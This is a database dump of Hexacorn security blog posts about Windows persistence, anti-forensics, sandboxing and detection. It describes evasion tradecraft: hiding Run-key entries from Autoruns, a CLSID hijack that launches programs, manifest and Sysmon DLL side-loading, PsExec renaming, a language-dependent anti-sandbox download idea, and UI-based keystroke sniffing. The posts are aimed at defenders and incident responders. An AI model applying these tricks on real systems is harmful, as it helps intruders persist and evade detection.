series, the idea is to delegate atomic actions, especially ones that are easy to spot by monitors, to signed binaries. Combining various functional bits and bobs offered by various tools one can build a decent chain of commands that will hide, or at least obfuscate the real purpose of the whole activity.\nShare this :)', 'Anti-*, Anti-Forensics, Compromise Detection, EDR, Forensic Riddles, Incident Response, Living off t', 'http://www.hexacorn.com/blog/2018/01/05/reusigned-binaries-living-off-the-signed-land-part-2/\n');
INSERT INTO `Hexacorn` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (55, 'Permanent Link to Yet another way to hide from Sysinternals’ tools', 'Hexacorn', 'January 4, 2018 ', 'The recipe is simple:\n\nPick up one of the environment variables.\nName your executable as ‘%environment variable%.exe’\nDrop it in a place where system will find it (as per PATH)\nSet e.g. Run key to point to it.\n\nExample:\n\nDrop c:\\WINDOWS\\%USERNAME%.exe\n\nAnd add:\n\nHKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\n“foobar”=”%USERNAME%”\n\nBoth Autoruns and Process Explorer (autorun location) won’t be able to locate the file, because they expand the environment variables. They will also mislead the user by showing a path to an executable that is definitely not on the system e.g. if the user’s name is JOHN, the entry I listed above will show up as ‘File not found: john.exe’. Looking for ‘john.exe’ on the system will not bring any relevant results.\nBonus #1:\nYou could concatenate a number of environment variables – the file will run, but the entry in the Autoruns will look like a bug. Only visiting the actual entry in the Registry will allow you to spot the trick.\nBonus #2:\nUsing less common environment variables can give even more random misleading information eg. ‘%PROCESSOR_LEVEL%’ can resolve to ‘6.exe’. Finding that ‘6.exe’ on the system will be pretty tricky.\nBonus #3:\nUsing ‘%ComSpec%’ gives the most intriguing result.\nAutoruns will resolve it to ‘c:\\WINDOWS\\System32\\cmd.exe’ instead of ‘c:\\WINDOWS\\%ComSpec%.exe’ and… since the resolved binary is native OS signed executable… it will be hidden from the view, unless you Unhide the ‘Hide Windows Entries’.\nShare this :)', 'Anti-*, Anti-Forensics, Autostart (Persistence), Compromise Detection, Forensic Analysis, Incident R', 'http://www.hexacorn.com/blog/2018/01/04/yet-another-way-to-hide-from-sysinternals-tools/\n');
INSERT INTO `Hexacorn` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (56, 'Permanent Link to Happy New Year 2018 & Get yourself logs from 250K sandboxed samples', 'Hexacorn', 'December 31, 2017 ', 'Update 2\nPlease use this link:\nhttps://mega.nz/#!LItwzAAL!NqcMVEnIqd17x5guL0V55gwjy8Q3xQMuSyeP-DelbRE\nUpdate\nTurns out I had a bug in my script and in the first go I exported less than 250K sessions (228K only), so I had to fix the dump and re-upload it. If you downloaded it previously, sorry, you will need to do it one more time \nThanks to @hrbrmstr for spotting and reporting the issue!\nOld post\nHappy New Year 2018!\nUnless you are one of the companies or organizations doing commercial sample analysis and sandboxing it is almost impossible to get access to normalized data logs from sandboxing sessions. If you want to do analysis you need to either scrap data from the web, or run your own sandbox. In order to fill-in the gap I decided to release logs from 250,000 sandbox sessions.\n\nThe file contains logs from 250K sandboxed sessions (250K unique samples).\n32-bit PEs only. All executed Offline (no access to network).\nSometimes it may not be 100% accurate – I ran various sessions, with various settings/timeouts.\nYou’ll find traces of Windows API, NT API, VC and Delphi inline functions, COM, Visual Basic, string functions, Nullsoft APIs, Anti-VM tricks, etc. – and various stuff I discussed or will discuss in the Enter Sandbox series.\n\nHave a look, run some analysis, crunch data – share results.\nLink: https://mega.nz/#!XYcnTAyD!VvwOo9JBkqmRNPu5liSusl3tpC0kBpbRT6E8tfOejF0\nFile sizes (sha1 hashes):\n34,515,244,109 Sandbox_250k_logs_Happy_New_Year_2018\r\n               (30010C605B451CEA6483B93B299FA9758747B1DF)\r\n   993,911,182 Sandbox_250k_logs_Happy_New_Year_2018.7z\r\n               (D73FDAAC08B95536FA2702D327C8F3143A9A666C)\nNote: This data cannot be used for commercial purposes.\nIf you like this release, you may also want to re-visit my older data dumps:\n\nhttp://www.hexacorn.com/blog/2014/12/23/santas-bag-full-of-mutants/\nhttp://www.hexacorn.com/blog/2015/04/05/the-easter-bunny-comes-with-a-bag-full-of-events/\nhttp://www.hexacorn.com/blog/2015/02/19/year-of-sheep-starts-with-a-bag-full-of-atoms/\nhttp://www.hexacorn.com/blog/2015/12/20/santas-bag-full-of-user-agents/\n\nFile format:\n\nThe file starts with a short header (easy to spot)\nThen it’s followed by the ### SAMPLE #<number>\nThen the actual logs start.\n\nThe lines start with [PID][TID][ADDRESS]\nThe API groups are prefixed with group prefixes i.e. API::, DELPHI::, VC:: (the latter are referring to inline functions)\nThe parameters are NOT named / structured accordingly to Windows API docs; this is because the log is focused on extracting the most useful information, and avoiding cluttering the log with the useless/unused function arguments (but then even this is only partially true, because this tool was growing organically over the years and was not an orchestrated effort to make OCDs  happy  – if I was about to write it again, obviously it would be perfect \n\n\n\nExample:\n### SAMPLE #00000001\r\n[1980][252][00422c77]API::GetSystemTimeAsFileTime (lpSystemTimeAsFileTime=0012FFB0)\r\n[1980][252][0041c305]API::GetModuleHandleW (lpModuleName=kernel32.dll)=7C800000\r\n[1980][252][0041c315]API::GetProcAddress (mod=KERNEL32.dll, api=FlsAlloc)=00000000\r\n[1980][252][0041c328]API::GetProcAddress (mod=KERNEL32.dll, api=FlsFree)=00000000\r\n[1980][252][0041c33b]API::GetProcAddress (mod=KERNEL32.dll, api=FlsGetValue)=00000000\r\n[1980][252][0041c34e]API::GetProcAddress (mod=KERNEL32.dll, api=FlsSetValue)=00000000\r\n[1980][252][0041c361]API::GetProcAddress (mod=KERNEL32.dll, api=InitializeCriticalSectionEx)=00000000\r\n[1980][252][0041c374]API::GetProcAddress (mod=KERNEL32.dll, api=CreateSemaphoreExW)=00000000\r\n[1980][252][0041c387]API::GetProcAddress (mod=KERNEL32.dll, api=SetThreadStackGuarantee)=00000000\r\n[1980][252][0041c39a]API::GetProcAddress (mod=KERNEL32.dll, api=CreateThreadpoolTimer)=00000000\r\n[1980][252][0041c3ad]API::GetProcAddress (mod=KERNEL32.dll, api=SetThreadpoolTimer)=00000000\r\n[1980][252][0041c3c0]API::GetProcAddress (mod=KERNEL32.dll, api=WaitForThreadpoolTimerCallbacks)=00000000\r\n[1980][252][0041c3d3]API::GetProcAddress (mod=KERNEL32.dll, api=CloseThreadpoolTimer)=00000000\r\n[1980][252][0041c3e6]API::GetProcAddress (mod=KERNEL32.dll, api=CreateThreadpoolWait)=00000000\r\n[1980][252][0041c3f9]API::GetProcAddress (mod=KERNEL32.dll, api=SetThreadpoolWait)=00000000\r\n[1980][252][0041c40c]API::GetProcAddress (mod=KERNEL32.dll, api=CloseThreadpoolWait)=00000000\r\n[1980][252][0041c41f]API::GetProcAddress (mod=KERNEL32.dll, api=FlushProcessWriteBuffers)=00000000\r\n[1980][252][0041c432]API::GetProcAddress (mod=KERNEL32.dll, api=FreeLibraryWhenCallbackReturns)=00000000\r\n[1980][252][0041c445]API::GetProcAddress (mod=KERNEL32.dll, api=GetCurrentProcessorNumber)=00000000\r\n[1980][252][0041c458]API::GetProcAddress (mod=KERNEL32.dll, api=GetLogicalProcessorInformation)=7C861E6F\r\n[1980][252][0041c46b]API::GetProcAddress (mod=KERNEL32.dll, api=CreateSymbolicLinkW)=00000000\r\n[1980][252][0041c47e]API::GetProcAddress (mod=KERNEL32.dll, api=SetDefaultDllDirectories)=00000000\r\n[1980][252][0041c491]API::GetProcAddress (mod=KERNEL32.dll, api=EnumSystemLocalesEx)=00000000\r\n[1980][252][0041c4a4]API::GetProcAddress (mod=KERNEL32.dll, api=CompareStringEx)=00000000\r\n[1980][252][0041c4b7]API::GetProcAddress (mod=KERNEL32.dll, api=GetDateFormatEx)=00000000\r\n[1980][252][0041c4ca]API::GetProcAddress (mod=KERNEL32.dll, api=GetLocaleInfoEx)=00000000\r\n[1980][252][0041c4dd]API::GetProcAddress (mod=KERNEL32.dll, api=GetTimeFormatEx)=00000000\r\n[1980][252][0041c4f0]API::GetProcAddress (mod=KERNEL32.dll, api=GetUserDefaultLocaleName)=00000000\r\n[1980][252][0041c503]API::GetProcAddress (mod=KERNEL32.dll, api=IsValidLocaleName)=00000000\r\n[1980][252][0041c516]API::GetProcAddress (mod=KERNEL32.dll, api=LCMapStringEx)=00000000\r\n[1980][252][0041c529]API::GetProcAddress (mod=KERNEL32.dll, api=GetCurrentPackageId)=00000000\r\n[1980][252][0041ab40]API::GetCommandLineW = \"_0000034AD55817135B1B1C4AE97CD449.exe\"\r\n[1980][252][004228f9]API::GetModuleFileNameW (mod=00000000, namebuf=%SYSTEM%\\_0000034AD55817135B1B1C4AE97CD449.exe, buflen=260)\r\n[1980][252][00424495]API::MultiByteToWideChar (CodePage=000004E4,dwFlags=MB_PRECOMPOSED [00000001, 1],lpMultiByteStr= \r\n[1980][252][0042450c]API::MultiByteToWideChar (CodePage=000004E4,dwFlags=MB_PRECOMPOSED [00000001, 1],lpMultiByteStr= \r\n[1980][252][0041be2d]API::MultiByteToWideChar (CodePage=000004E4,dwFlags=MB_PRECOMPOSED [00000001, 1],lpMultiByteStr= \r\n[1980][252][0041bea1]API::MultiByteToWideChar (CodePage=000004E4,dwFlags=MB_PRECOMPOSED [00000001, 1],lpMultiByteStr= \r\n[1980][252][0041bf83]API::WideCharToMultiByte (cp= [000004E4, 1252],fl= [00000000, 0],wide= \r\n[1980][252][0041be2d]API::MultiByteToWideChar (CodePage=000004E4,dwFlags=MB_PRECOMPOSED [00000001, 1],lpMultiByteStr= \r\n[1980][252][0041bea1]API::MultiByteToWideChar (CodePage=000004E4,dwFlags=MB_PRECOMPOSED [00000001, 1],lpMultiByteStr= \r\n[1980][252][0041bf83]API::WideCharToMultiByte (cp= [000004E4, 1252],fl= [00000000, 0],wide= \r\n[1980][252][0041c543]API::SetUnhandledExceptionFilter (0042247D)\r\n[1980][252][00401dde]VC::vc_strlen1 (lpString=\\/)\r\n[1980][252][0040df7c]API::GetTempPathA (namebuf=C:\\DOCUME~1\\USERNAME\\LOCALS~1\\Temp\\, buflen=260)\nShare this :)', 'Batch Analysis, Clustering, Malware Analysis, Sandboxing', 'http://www.hexacorn.com/blog/2017/12/31/happy-new-year-2018-get-yourself-logs-from-250k-sandboxed-samples/\n');
INSERT INTO `Hexacorn` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (57, 'Permanent Link to Beyond good ol’ Run key, Part 70', 'Hexacorn', 'December 30, 2017 ', 'Back in early 2000s shell extensions and desktop enhancers were very popular. Some of these ideas survived till today and even now one can either use pre-installed ones, or install new deskbands on the system.\nThere are many coders who already did a great job explaining what desk bands are and how to implement them, so instead of pretending that I know what I am talking about, I will just suggest that you read this great article ‘Shell Extensibility – Explorer Desk Band, Tray Notification Icon et al.‘ by Alex Blekhman. When you run the Calendar.exe that is attached to the article you will then have an option to make the calendar present as a Deskband\n\nInterestingly enough, as far as I can tell Autoruns still doesn’t detect them.\nTo find out where the information about deskbands and other Explorer extension bars is stored in Registry you can read this article.\nIf you are in a hurry, just need to enumerate Registry and look for all CLSIDs with the Implemented Categories\\ key with the following deskband identifiers set:\nDeskBand\r\n{00021492-0000-0000-C000-000000000046}\r\n\r\nVerticalBand \r\n{00021493-0000-0000-C000-000000000046}\r\n\r\nHorizontalBand \r\n{00021494-0000-0000-C000-000000000046}\ne.g.:\nHKLM\\SOFTWARE\\Classes\\CLSID\\...\\\nImplemented Categories\\{00021492-0000-0000-C000-000000000046}\nAdditionally, it may be worth checking the following key:\nHKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\\r\nDiscardable\\PostSetup\\Component Categories\\...\\Enum\nThis is where Explorer stores cached information about explorer bar objects.\nShare this :)', 'Anti-*, Anti-Forensics, Archaeology, Autostart (Persistence), Forensic Analysis, Incident Response, ', 'http://www.hexacorn.com/blog/2017/12/30/beyond-good-ol-run-key-part-70/\n');
INSERT INTO `Hexacorn` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (58, 'Permanent Link to Using localization as a (lame) anti-sandbox/anti-debug trick', 'Hexacorn', 'December 30, 2017 ', 'Most of the sandboxes that I know of use English as a base language. It is not surprising – after all anglophones are probably one of the most targeted user bases out there anyway. However… there is still a huge population of users using their non-English native languages. For these, the localization industry works hard to deliver the user interface experience in their native language. Windows alone is localized to a large number languages and supports both number of languages/locales and a multilingual user interface (MUI).\nLocalization of software is non-trivial and Windows helps with it in many ways. One of the most popular tricks in localization engineers’/developers’ hands is moving the textual part of the UI to so-called string resources. You may find them in most of the programs by inspecting them with a resource hacker tool.\nWhat’s interesting is that by combining this feature with the under-the-hood localization that is done by OS depending on the currently used UI language you may get two (or more) different results while running the same code which does not (at least on the surface) contain any conditional code.\nLet’s have a look at the example.\nThe code below loads a string from the resources, and shows a message box.\n invoke GetModuleHandle,NULL\r\n invoke LoadStringW,eax,1500,Offset Buffer,512\r\n invoke MessageBoxW,NULL,Offset Buffer,Offset Buffer,MB_OK\nNothing really unusual. If you run this code on the English Windows, you will see a message box showing ‘Hello’:\n\nIf you run the very same code on the French Windows, you will get the message ‘Bonjour’:\n\nWhen LoadStringW API is called, Windows recognizes the language of the OS and retrieves one of the strings stored inside the executable:\n\r\nSTRINGTABLE\r\nLANGUAGE LANG_ENGLISH, SUBLANG_ENGLISH_US\r\n{\r\n1500, \"Hello\"\r\n}\r\nSTRINGTABLE\r\nLANGUAGE LANG_FRENCH, SUBLANG_FRENCH\r\n{\r\n1500, \"Bonjour\"\r\n}\nNow, if instead of showing the message the retrieved string was treated as an URL that could be used to download file with URLDownloadToFileW and then that file was executed with WinExec we could easily get two different execution flows, dependent on the OS (and URLs configured separately for two (or more) languages).\nIt would take hawk eyes of the reverser to spot this, because unless s/he looked at the resources, the debug session, and any English-focused sandbox would not recognize this subtle (and hidden) code flow change. While it’s easy to spot it in a small program, dealing with any larger, or more advanced program, or perhaps one where the trick is used in a more clandestine way would go most likely unnoticed.\nYou can download the Hello/Bonjour example from here. I didn’t bother to create URLDownloadToFileW/WinExec one, because it’s a pretty lame thing anyway…\nShare this :)', 'Anti-*, Malware Analysis', 'http://www.hexacorn.com/blog/2017/12/30/using-localization-as-a-lame-anti-sandbox-anti-debug-trick/\n');
INSERT INTO `Hexacorn` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (59, 'Permanent Link to Beyond good ol’ Run key, Part 69', 'Hexacorn', 'December 29, 2017 ', 'This is just a quick post to highlight a possibility of abusing yet another configuration setting for persistence reasons. It’s not really a lot of trickery at work – it’s actually a legitimate feature documented by Microsoft and which allows to change the way executable manifests are loaded.\nBy changing the registry key:\nHKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\SideBySide\r\n\"PreferExternalManifest\"=dword:00000001\n– the system will start using an external .manifest file for the executables, if such .manifest files exists. Modification of such external .manifest allows to load malicious component (DLL side-loading via Side by Side /SxS/).\nWhile googling around about this setting I came across these posts that highlight issues that you may come across when this setting is changed and the Windows Sxs Activation Context Cache is not refreshed (the settings and external manifest will be ignored until you force the cache refresh by manipulating the timestamps):\n\nhttp://csi-windows.com/blog/all/27-csi-news-general/245-find-out-why-your-external-manifest-is-being-ignored\nhttps://blogs.msdn.microsoft.com/junfeng/2007/10/01/windows-vista-sxs-activation-context-cache/\n\n \nShare this :)', 'Anti-*, Anti-Forensics, Autostart (Persistence), Forensic Analysis, Incident Response, Malware Analy', 'http://www.hexacorn.com/blog/2017/12/29/beyond-good-ol-run-key-part-69/\n');
INSERT INTO `Hexacorn` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (60, 'Permanent Link to Weird DLL behavior', 'Hexacorn', 'December 28, 2017 ', 'I was toying around with the static DLL loading and came across a very strange behavior.\nSo… I created a small .exe file that depends on dll1.dll and dll2.dll, linked statically, and calls function1 and function2 from each DLL respectively.\n...\r\nStart:\r\n invoke function1 ; from dll1.dll\r\n invoke function2 ; from dll2.dll\r\n invoke ExitProcess,0\r\n\r\n\nWhen loaded (and when the respective function is called) the DLLs create one of the following files:\n\nDLL1.DLL\n\nc:\\test\\dll1_attached – DLL is loaded (attached)\nc:\\test\\dll1_detached – DLL is unloaded (detached)\nc:\\test\\dll1_function – ‘function’ is called\n\n\nDLL2.DLL\n\nc:\\test\\dll2_attached – DLL is loaded (attached)\nc:\\test\\dll2_detached – DLL is unloaded (detached)\nc:\\test\\dll2_function – ‘function’ is called\n\n\n\nI then modified the section attributes for dll2.dll so that its .text section doesn’t have code execution rights.\n Name: .text\r\n VirtualSize: 0x00000070\r\n VirtualAddress: 0x00001000\r\n SizeOfRawData: 0x00000200\r\n PointerToRawData: 0x00000400\r\n PointerToRelocations: 0x00000000\r\n PointerToLinenumbers: 0x00000000\r\n NumberOfRelocations: 0x0000\r\n NumberOfLinenumbers: 0x0000\r\n Characteristics: 0x00000000 <---- no flags\nThe dll1.dll .text section looks like this:\n Name: .text\r\n VirtualSize: 0x00000070\r\n VirtualAddress: 0x00001000\r\n SizeOfRawData: 0x00000200\r\n PointerToRawData: 0x00000400\r\n PointerToRelocations: 0x00000000\r\n PointerToLinenumbers: 0x00000000\r\n NumberOfRelocations: 0x0000\r\n NumberOfLinenumbers: 0x0000\r\n Characteristics: 0x60000020 <---- (CODE, EXECUTE, READ)\nI then tested this file set on on Win 10 x64. After dropping the files into VM I ran the test.exe.\nThe first run shows the expected behaviour – i.e. the application crashes:\n\nThere is an event logged in the Event Logs as well:\n\nTo my surprise, when I re-run the test.exe it… actually works:\nRunning it again and again I am getting inconsistent results. I drop the files into a win10 VM and sometimes it crashes with the first run, same as described above. And sometimes it runs smoothly.\nFor the same set of files tested on Win7 x64 – I get the ‘dll1_attached’ created, but then the test.exe crashes.\nWhen dropped into XP VM, it works w/o any issues (files are created).\nWhen I manipulate .text section attributes for dll1.dll the application always crashes. So, it would seem that the section of the first DLL cannot be modified, but the second one can.\nI am now scratching my head… Looks like a potential DLL mapping bug?\nThe memory layout looks like this:\n\nIdeas?\nYou can grab the files here.\nShare this :)', 'Random ideas', 'http://www.hexacorn.com/blog/2017/12/28/weird-dll-behavior/\n');
INSERT INTO `Hexacorn` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (61, 'Permanent Link to PsExec going places…', 'Hexacorn', 'December 25, 2017 ', 'As a threat hunter you surely know that PSEXESVC.EXE is one of these nice signature-friendly artifacts that you will want to catch with your process/service creation rules. It’s one of the easiest way to spot the lateral movement.\nUnfortunately, there is a catch.\nYou see, for a number of years now the psexec has that nice command line argument ‘-r’ that allows you to create a service name as per your liking; this affects the artifacts it creates on the remote system.\nYou can test it by running the following command:\nPsExec.exe -r foobar \\\\localhost cmd.exe\nThe tool will drop c:\\WINDOWS\\foobar.exe and will start the service called ‘foobar’:\n\nThe flag will cause the named pipes used by Psexec (-stdin, -stdout and -stderr) to be renamed as well (I forgot to mention it in the original post, thx to @spinning_monkey for reminding me).\nI guess the original idea behind the introduction of this flag was to allow multiple psexec versions (or instances) to co-exist on the remote system, but the side-effect is that you can’t detect psexec being present by relying on just a service / file name only.\nShare this :)', 'Anti-Forensics, Compromise Detection, Forensic Analysis, Incident Response', 'http://www.hexacorn.com/blog/2017/12/25/psexec-going-places/\n');
INSERT INTO `Hexacorn` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (62, 'Permanent Link to Living off the land: VMware tools zip.exe', 'Hexacorn', 'December 13, 2017 ', 'Just a quick note that any system with VMWare Tools installed on it can use the zip.exe as a ‘process tree disturbing agent’ \n\nName your program unzip.exe\nRun:\n\n“c:\\Program Files\\VMware\\VMware Tools\\zip.exe” -T <name of an existing zip>\n\n\n\nWhen launched with the -T option, zip.exe will execute the unzip.exe.\nShare this :)', 'Anti-*, Living off the land', 'http://www.hexacorn.com/blog/2017/12/13/living-off-the-land-vmware-tools-zip-exe/\n');
INSERT INTO `Hexacorn` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (63, 'Permanent Link to Sysmon doing lines, part 2', 'Hexacorn', 'December 11, 2017 ', 'Sysmon is a cool tool and we love it. Sometimes it does not work as expected though.\nIt’s late so just dropping another recipe here:\n\nName your DLL wevtapi.dll\nRun sysmon.exe -u to … ‘uninstall’ it\nYour DLL will be loaded\n\n\nYou can also drop Riched32.dll and try to ‘install’ sysmon – you will notice the EULA box is loaded incorrectly, because the side-loaded Riched32.dll DLL will take over and will execute your code.\n\nShare this :)', 'Living off the land, Sideloading', 'http://www.hexacorn.com/blog/2017/12/11/sysmon-doing-lines-part-2/\n');
INSERT INTO `Hexacorn` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (64, 'Permanent Link to UI Anomalies – Beyond AV, EDR, and UEBA (also, user monitoring & keylogging w/o tr', 'Hexacorn', 'December 10, 2017 ', 'Many GUI frameworks use their own drawing primitives and don’t necessarily rely on the built-in windows controls (examples include Delphi applications, Microsoft Office, Internet Explorer, Firefox, Chrome, Lotus Notes, .NET applications, etc.). As such, obtaining text visible on some window controls e.g. buttons, menus, tabs, custom edit controls, etc. using GetWindowText, or sending/posting WM_GETTEXT message doesn’t work most of the time (this is btw. how the old password sniffers used to work).\nOver 10 years ago I was researching a way to obtain a window text from such non-standard windows controls. This is how I came across a AccessibleObjectFromPoint API and the IAccessible interface – these belong to what is now a part of UI Automation and Microsoft Active Accessibility APIs.\nI decided to write about it, because today I suddenly remembered my PoC program I wrote back then – it was a simple GUI application that was registering a hook, reacting to a CTRL+RIGHT MOUSE CLICK sequence. When activated it was calling AccessibleObjectFromPoint API for a current mouse cursor position to obtain the pointer to the IAccessible interface for the GUI element underneath. The interface could be then queried for the name and value of the UI control. Luckily, many unusual framework support this interface enabling us to query non-standard controls.\nTo my surprise my PoC still works on Windows 10 (although not for all controls). The below screenshot shows the debug window (top left) and the moment I copy the text (bottom) from the Microsoft Edge’s tab (top right; normally this text is not ‘copypasteable’).\n\nEncouraged by this re-discovery I started reading what has changed since the time I wrote my PoC and I guess you know why. Being able to sniff on the User Interface is a pretty neat way of stealing information w/o engaging traditional means of sniffing used by keyloggers.\nI was no disappointed, turns out there is an even great PoC written and maintained by Microsoft which I can use in this post w/o needing to write any code. The program is called Inspect.exe and can be found inside the Windows SDK e.g.:\n\nc:\\Program Files (x86)\\Windows Kits\\10\\bin\\x86\\inspect.exe\n\nWhen you launch it, it will show you all the windows currently present on your desktop:\n\nIn my case, you can see an open Total Commander, Microsoft Edge, Calculator, and Process Hacker, Program Manager and Inspect itself.\nThe interesting stuff happens as you start using these applications with Inspect running in a background. The program will ‘follow’ your activity showing you exactly what and when was clicked, what menu was selected, text entered, etc.\nFor example, if I launch Notepad, then go to File -> New it will be immediately tracked by the Inspect program.\n\nAnd what happens when I type text in the Notepad?\n\nThis applies to most windows on the screen.\nThere are at least two questions in my mind at this stage:\n\nHow many malware families actively use it for stealing information, if any?\nHow many security solutions monitor these accessibility APIs today?\n\nAnd let’s not forget about the good side of things.\nImagine incorporating a log of these actions (perhaps without intercepting the values, for legal reasons) and storing it in the Log outside of the monitored box? You could basically re-create and re-play the whole activity prior to incident occurring. There is also a huge number of new use cases you could develop based on these scenarios. By linking the malicious activities to actual UI behavior we could establish a strong case for finding both malicious external attackers and bad insiders. The volumes may be an issue, but this is not going to be problem long-term.\nUI Anomaly Hunting anyone?\nShare this :)', 'Anti-*, Compromise Detection, Forensic Analysis, Incident Response, Random ideas', 'http://www.hexacorn.com/blog/2017/12/10/ui-anomalies-beyond-av-edr-and-ueba-also-user-monitoring-keylogging-w-o-traditional-tricks/\n');
INSERT INTO `Hexacorn` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (65, 'Permanent Link to Beyond good ol’ Run key, Part 68', 'Hexacorn', 'December 8, 2017 ', 'Modification of Software\\Classes\\CLSID branches is a well-known trick used by malware for ages. It is important to recognize though that there are many variants of the trick – the keys are used by different applications and libraries, and for really different purposes – there is no end to possibilities they offer to malware authors.\nHere’s a probably less-known CLSID branch that could be used to execute malware anytime you press WIN+E to open a new Windows Explorer window.\nExample for calculator (tested on win10):\nHKCU\\Software\\Classes\\CLSID\\\r\n{52205fd8-5dfb-447d-801a-d0b52f2e83e1}\\\r\nshell\\opennewwindow\\command\r\n\"DelegateExecute\"=\"\"\r\n@=\"c:\\\\windows\\\\system32\\\\calc.exe\"\r\n\nUpdate\nThere is a side-effect to this setting; launching explorer.exe – whether via WIN+E or directly via clicking explorer.exe inside Windows Explorer, or running it via WIN+R will always end up with calc.exe being executed. The malware would need to handle these situation with an appropriate action.\nShare this :)', 'Anti-*, Anti-Forensics, Autostart (Persistence), Compromise Detection, Forensic Analysis, Incident R', 'http://www.hexacorn.com/blog/2017/12/08/beyond-good-ol-run-key-part-68/\n');
INSERT INTO `Hexacorn` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (66, 'Permanent Link to svchost.exe -> explorer.exe on win10', 'Hexacorn', 'December 7, 2017 ', 'When Windows Explorer is killed on Win 10, and then manually relaunched with an elevated account, it is actually re-launched by svchost.exe 5 seconds later via a temporary task C:\\Windows\\Tasks\\CreateExplorerShellUnelevatedTask.job – see below; so, if you see explorer.exe under svchost.exe it doesn’t necessary mean malware.\nThere is additional information in this thread that mentions this is a mechanism to prevent spawning an elevated Explorer process.\n<?xml version=\"1.0\" encoding=\"UTF-16\"?>\r\n<Task version=\"1.3\" xmlns=\"http://schemas.microsoft.com/windows/2004/02/mit/task\">\r\n  <RegistrationInfo>\r\n    <Author>ExplorerShellUnelevated</Author>\r\n    <URI>\\CreateExplorerShellUnelevatedTask</URI>\r\n  </RegistrationInfo>\r\n  <Triggers>\r\n    <RegistrationTrigger id=\"CreateExplorerShell_Trigger\">\r\n      <Enabled>true</Enabled>\r\n      <Delay>PT0S</Delay>\r\n    </RegistrationTrigger>\r\n  </Triggers>\r\n  <Settings>\r\n    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>\r\n    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>\r\n    <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>\r\n    <AllowHardTerminate>true</AllowHardTerminate>\r\n    <StartWhenAvailable>true</StartWhenAvailable>\r\n    <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>\r\n    <IdleSettings>\r\n      <Duration>PT10M</Duration>\r\n      <WaitTimeout>PT1H</WaitTimeout>\r\n      <StopOnIdleEnd>true</StopOnIdleEnd>\r\n      <RestartOnIdle>false</RestartOnIdle>\r\n    </IdleSettings>\r\n    <AllowStartOnDemand>true</AllowStartOnDemand>\r\n    <Enabled>true</Enabled>\r\n    <Hidden>false</Hidden>\r\n    <RunOnlyIfIdle>false</RunOnlyIfIdle>\r\n    <DisallowStartOnRemoteAppSession>false</DisallowStartOnRemoteAppSession>\r\n    <UseUnifiedSchedulingEngine>true</UseUnifiedSchedulingEngine>\r\n    <WakeToRun>false</WakeToRun>\r\n    <ExecutionTimeLimit>PT72H</ExecutionTimeLimit>\r\n    <Priority>6</Priority>\r\n  </Settings>\r\n  <Actions Context=\"Author\">\r\n    <Exec>\r\n      <Command>C:\\Windows\\explorer.exe</Command>\r\n      <Arguments>/NOUACCHECK</Arguments>\r\n    </Exec>\r\n  </Actions>\r\n  <Principals>\r\n    <Principal id=\"Author\">\r\n      <UserId>xxxxxxxxxx\\user</UserId>\r\n      <LogonType>InteractiveToken</LogonType>\r\n      <RunLevel>LeastPrivilege</RunLevel>\r\n    </Principal>\r\n  </Principals>\r\n</Task>\nShare this :)', 'Forensic Analysis, Incident Response, Malware Analysis', 'http://www.hexacorn.com/blog/2017/12/07/svchost-exe-explorer-exe-on-win10/\n');
INSERT INTO `Hexacorn` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (67, 'Permanent Link to A couple of interesting MD5 hashes', 'Hexacorn', 'December 7, 2017 ', 'd41d8cd98f00b204e9800998ecf8427e\n\nan empty file\n\n4a587187d760161311010b03417b3c3f\n\nscs[digits].tmp 2,686 bytes – created by ntvdm.exe; omnipresent on some older images\n\n71f4b39c5eb73df738ad3e0dacd89057\n\nscs[digits].tmp 1,670 bytes – created by ntvdm.exe; omnipresent on some older images\n\n754037e7be8f61cbb1b85ab46c7da77d\n\nRC4 key used by Andromeda; it’s an MD5 of a text ‘go fuck yourself’\n\ncdc47d670159eef60916ca03a9d4a007\n\nMd5 of 2 files demonstrating Md5 collision: hello.exe and erase.exe\n\nda5c61e1edc0f18337e46418e48c1290\n\nSimilar collision applied to Linux files\n\na25f7f0b29ee0b3968c860738533a4b9\n\nAnother md5 collision: letter_of_rec.ps and order.ps\n\nIf you know any other interesting hashes please let me know.\nShare this :)', 'Trivia', 'http://www.hexacorn.com/blog/2017/12/07/a-couple-of-interesting-md5-hashes/\n');
INSERT INTO `Hexacorn` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (68, 'Permanent Link to Enter Sandbox – part 15: rE[mn]u[mn]eration games', 'Hexacorn', 'November 24, 2017 ', 'Observing a malware is one thing. Observing the very same malware in a rich context is another.\nThe traditional approach to sandboxes focuses on scoring the sample’s badness, extracting IOCs, and not focusing that much on the in-depth analysis. It’s understandable, because in-depth analysis are not the ultimate goal. Still… being able to extract more information that may help with the manual analysis is always welcome. And it’s actually getting better – the competition is slowly changing the landscape and newer sandboxes support memory dumping, PE file rebuilding, show nice process / thread trees, various graphs, etc… and place more and more hooks in place. And then again, even if they intercept the most popular APIs, inline functions, or even intercept virtual tables, it may still not be enough.\nI thought, what would happen if I intercepted not only the most popular APIs that are used by malware, but also these that are less-frequently looked at, and in particular, these that may help to understand a flow of events in a better context – enriching the data that sandbox presents and making the in-depth analysis easier.\nWhat are these APIs?\nLet me show you an example…\nImagine you intercept the function CreateToolhelp32Snapshot to take a note of the fact that the malware 